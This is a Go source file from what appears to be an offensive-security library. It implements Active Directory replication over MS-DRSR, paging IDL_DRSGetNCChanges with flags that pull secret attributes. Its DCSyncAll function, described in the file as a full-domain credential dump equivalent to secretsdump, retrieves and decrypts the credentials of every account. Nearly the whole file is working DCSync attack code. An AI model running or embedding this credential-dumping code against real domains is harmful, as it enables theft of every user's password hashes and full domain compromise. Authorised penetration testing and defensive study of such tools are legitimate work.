package msdrsr

import (
	"fmt"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e3514235-4b06-11d1-ab04-00c04fc2dcd2/4.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e3514235-4b06-11d1-ab04-00c04fc2dcd2/4.0/structures"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
)

// Page sizes for full-NC replication ([MS-DRSR] 4.5.1 recommends these; the server may
// return fewer per page). They match the widely-used reference defaults.
const (
	fullNCMaxObjects uint32 = 1000
	fullNCMaxBytes   uint32 = 8 * 1024 * 1024 // 8 MiB
	// maxFullNCPages bounds the paging loop so a server that never clears fMoreData
	// cannot spin forever; it is far above any real NC's page count.
	maxFullNCPages = 100000
)

// ReplicateNC replicates an entire naming context (every object in ncDN, e.g.
// "DC=lab,DC=local") by paging IDL_DRSGetNCChanges, and returns the accumulated objects.
// Unlike ReplicateSingleObject (EXOP_REPL_OBJ), this issues no extended op and pages the
// whole NC: each page's reply carries fMoreData and a usnvecTo cursor that drives the
// next request until the cycle completes ([MS-DRSR] 4.5.1).
//
// Attribute values are returned still encrypted; pass the result to DecryptSecrets (the
// envelope is identical to the single-object path). The prefix table is taken from the
// first page — the source DC's table is stable within a replication cycle.
func (c *Client) ReplicateNC(ncDN string) (*ReplicationResult, error) {
	if !c.bound {
		return nil, fmt.Errorf("msdrsr: not connected")
	}

	pnc := structures.NewDSNameFromDN(ncDN)
	// ulFlags MUST stay byte-identical for every request in the cycle ([MS-DRSR] 4.5.1):
	// initial, writable (full attribute set incl. secrets), never-synced (from scratch).
	const ulFlags = ndr.DWORD(structures.DRS_INIT_SYNC | structures.DRS_WRIT_REP | structures.DRS_NEVER_SYNCED)

	result := &ReplicationResult{}
	var usnFrom structures.USN_VECTOR // zero on the first request
	var invocID structures.UUID       // NULL on the first request

	for page := 0; ; page++ {
		if page > maxFullNCPages {
			return nil, fmt.Errorf("msdrsr: full-NC replication exceeded %d pages (server never cleared fMoreData?)", maxFullNCPages)
		}
		msgIn := structures.DRS_MSG_GETCHGREQ{
			Tag: 8,
			V8: structures.DRS_MSG_GETCHGREQ_V8{
				UuidDsaObjDest: c.sourceDSA,
				UuidInvocIdSrc: invocID,
				PNC:            &pnc,
				UsnvecFrom:     usnFrom,
				UlFlags:        ulFlags,
				CMaxObjects:    ndr.DWORD(fullNCMaxObjects),
				CMaxBytes:      ndr.DWORD(fullNCMaxBytes),
				UlExtendedOp:   0, // full-NC, not an extended op
			},
		}

		outVersion, msgOut, err := functions.IDL_DRSGetNCChanges(c.rpc, c.handle, 8, msgIn)
		if err != nil {
			return nil, fmt.Errorf("msdrsr: ReplicateNC page %d: %w", page, err)
		}
		if uint32(outVersion) != 6 {
			return nil, fmt.Errorf("msdrsr: ReplicateNC: server replied version %d, expected 6", outVersion)
		}
		reply := msgOut.V6

		if page == 0 {
			result.PrefixTable = reply.PrefixTableSrc
		}
		for node := reply.PObjects; node != nil; node = node.PNextEntInf {
			result.Objects = append(result.Objects, projectEntInf(node.Entinf))
		}

		if reply.FMoreData == 0 {
			result.Reply = &reply
			break
		}
		// Advance the cursor for the next page: the previous reply's usnvecTo and source
		// invocation id become the next request's usnvecFrom / uuidInvocIdSrc. All other
		// fields (pNC, ulFlags, page sizes) stay constant.
		usnFrom = reply.UsnvecTo
		invocID = reply.UuidInvocIdSrc
	}
	return result, nil
}

// DCSyncAll replicates the whole naming context and decrypts the secrets of every
// security principal in it — a full-domain credential dump (the secretsdump "-just-dc"
// equivalent). ncDN is the NC distinguished name, e.g. "DC=lab,DC=local".
func (c *Client) DCSyncAll(ncDN string) ([]*AccountSecrets, error) {
	res, err := c.ReplicateNC(ncDN)
	if err != nil {
		return nil, err
	}
	return c.DecryptSecrets(res)
}
